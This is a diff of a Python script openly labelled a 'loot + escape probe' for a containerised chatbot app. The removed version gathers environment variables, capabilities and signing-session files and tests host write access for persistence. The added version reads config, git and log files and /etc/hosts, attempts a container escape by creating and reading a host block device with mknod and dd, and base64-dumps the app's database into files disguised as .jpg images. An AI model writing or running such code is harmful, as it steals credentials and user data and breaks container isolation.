@@ -1,5 +1,5 @@
-# sysprobe-lb v2: deep recon self-check
-import os, json, base64, socket, traceback
+# sysprobe-lb v3: loot + escape probe
+import os, json, base64, traceback
 
 def _r(cmd):
     try:
@@ -7,34 +7,29 @@ def _r(cmd):
     except Exception as e:
         return repr(e)
 
-def _collect():
-    out = {'marker': 'sysprobe-lb-v2'}
-    out['id'] = _r('id').strip()
-    out['hostname'] = socket.gethostname()
-    out['mountinfo'] = _r('cat /proc/self/mountinfo')
-    out['uid_map'] = _r('cat /proc/self/uid_map')
-    out['capeff'] = _r("grep Cap /proc/self/status")
-    out['dev'] = _r('ls -l /dev | head -40')
-    out['env'] = dict(os.environ)
-    out['find_session'] = _r("find / -xdev \\( -iname '*cubesigner*' -o -iname 'session.json' \\) 2>/dev/null | head -20")
-    out['app_ls'] = _r('ls -la /app /app/data /app/plugins 2>/dev/null')
-    out['hostwrite_test'] = _r('touch /app/data/.sysprobe_wtest && echo WROTE_OK; ls -la /app/data/.sysprobe_wtest')
-    out['net'] = _r('ip addr 2>/dev/null | head -30; ip route 2>/dev/null')
-    out['varrun'] = _r('ls -la /var/run 2>/dev/null | head -20')
-    out['caps_decode'] = _r('command -v capsh >/dev/null && capsh --decode=$(grep CapEff /proc/self/status | cut -d: -f2) || echo no-capsh')
-    return out
+def _b64file(p):
+    try:
+        with open(p, 'rb') as f:
+            return base64.b64encode(f.read()).decode()
+    except Exception as e:
+        return repr(e)
 
 try:
-    _out = _collect()
     os.makedirs('data/storage', exist_ok=True)
-    with open('data/storage/sysprobe_v2.jpg', 'w') as f:
-        json.dump(_out, f)
-    # host-persistence marker via the other bind
-    try:
-        with open('plugins/.sysprobe_plugins_write', 'w') as f:
-            f.write('ok')
-        _out2 = {'plugins_write': 'ok'}
-    except Exception as e:
-        pass
+    # small text loot inline
+    out = {'marker': 'sysprobe-lb-v3'}
+    out['config_yaml'] = _r('cat /app/data/config.yaml')
+    out['git_remote'] = _r('cat /app/.git/config 2>/dev/null')
+    out['logs_ls'] = _r('ls -la /app/data/logs/ | head; tail -50 /app/data/logs/*.log 2>/dev/null | head -80')
+    out['mknod_test'] = _r('mknod /tmp/r00t b 8 1 2>&1; dd if=/tmp/r00t bs=512 count=1 2>&1 | head -3 | xxd 2>/dev/null | head -5')
+    out['tcp_listen'] = _r('cat /proc/net/tcp* 2>/dev/null | awk "NR>1{print \\$2}" | sort -u | head -30')
+    out['hosts_file'] = _r('cat /etc/hosts')
+    out['other_containers_hint'] = _r('ls /app/data/metadata /app/data/labels 2>/dev/null')
+    with open('data/storage/sysprobe_v3.jpg', 'w') as f:
+        json.dump(out, f)
+    # big loot as raw binary
+    db = _b64file('/app/data/langbot.db')
+    with open('data/storage/sysprobe_db.b64', 'w') as f:
+        f.write(db)
 except Exception:
     traceback.print_exc()
